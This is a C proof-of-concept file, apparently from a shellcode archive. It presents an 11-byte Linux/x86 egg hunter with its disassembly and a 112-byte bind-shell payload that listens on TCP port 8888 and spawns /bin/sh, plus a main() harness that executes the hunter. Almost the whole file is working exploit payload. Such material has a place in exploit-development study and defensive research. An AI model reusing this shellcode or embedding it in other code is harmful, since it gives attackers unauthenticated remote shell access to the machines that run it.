/*
# Title: Linux/x86 - EggHunter Shellcode (11 Bytes)
# Author: Anurag Srivastava
# Tested on: i686 GNU/Linux
# Shellcode Length: 11
#Description: Smallest Null-Free Egg Hunter Shellcode - 11 Bytes
Details:
1. Works with an executable EGG
2. Make sure you clear EDX, EAX registers in the shellcode before any other operations
#Reference : Nipun Jaswal (@nipunjaswal)
egg:     file format elf32-i386

Disassembly of section .text:

08048060 <_start>:
 8048060:	40                   	inc    eax
 8048061:	81 38 90 47 90 4f    	cmp    DWORD PTR [eax],0x4f904790
 8048067:	75 f7                	jne    8048060 <_start>
 8048069:	ff e0                	jmp    eax
 ===============POC by Anurag Srivastava=========================
*/
#include <stdio.h>
#include <string.h>
#define EXECEGG "\x90\x47\x90\x4f" //Executable EGG

unsigned char egg_hunter[] = \
"\x40\x81\x38\x90\x47\x90\x4f\x75\xf7\xff\xe0";

unsigned char egg[] = \
EXECEGG
// Bind TCP Shell 112 Bytes Port 8888
"\x31\xdb\x31\xc0\xb0\x66\xfe\xc3\x56\x6a\x01\x6a"
"\x02\x89\xe1\xcd\x80\x97\x56\x66\x68\x22\xb8\x66"
"\x6a\x02\x89\xe3\x6a\x10\x53\x57\x31\xdb\xf7\xe3"
"\xb0\x66\xb3\x02\x89\xe1\xcd\x80\x56\x57\x31\xdb"
"\xf7\xe3\xb0\x66\xb3\x04\x89\xe1\xcd\x80\x31\xdb"
"\xf7\xe3\x56\x56\x57\xb0\x66\xb3\x05\x89\xe1\xcd"
"\x80\x93\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79"
"\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62"
"\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80";
void main()
{
    printf("Length of Egg Hunter Shellcode:  %d\n", strlen(egg_hunter));
    printf("Length of the Actual Shellcode:  %d\n", strlen(egg));
    int (*ret)() = (int(*)())egg_hunter;
    ret();
}